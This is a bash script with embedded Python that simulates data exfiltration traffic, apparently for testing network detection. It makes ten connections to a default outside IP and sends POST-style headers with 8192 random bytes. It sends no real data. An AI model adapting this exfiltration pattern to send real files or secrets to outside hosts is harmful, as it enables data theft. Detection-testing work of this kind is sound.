#!/usr/bin/env bash
# exfil_sim.sh — data exfiltration simulation
# Large sustained uploads to a single destination (high byte_count, low pkt variance)
set -euo pipefail

TARGET="${1:-93.184.216.34}"
echo "[*] Exfiltration simulation → $TARGET"

python3 - <<PYEOF
import socket, os, time

target = "$TARGET"
# Simulate large data transfers: repeated large HTTP POST-like sends
for attempt in range(10):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2.0)
        s.connect((target, 80))
        # Send a large payload (mimics file exfiltration)
        payload = b"POST /upload HTTP/1.1\r\nHost: " + target.encode() + b"\r\nContent-Length: 65536\r\n\r\n"
        payload += os.urandom(8192)
        s.sendall(payload)
        time.sleep(0.2)
        s.close()
    except:
        pass

print("[*] Exfil simulation: 10 large-payload connections sent")
PYEOF

echo "[*] Exfil simulation complete"
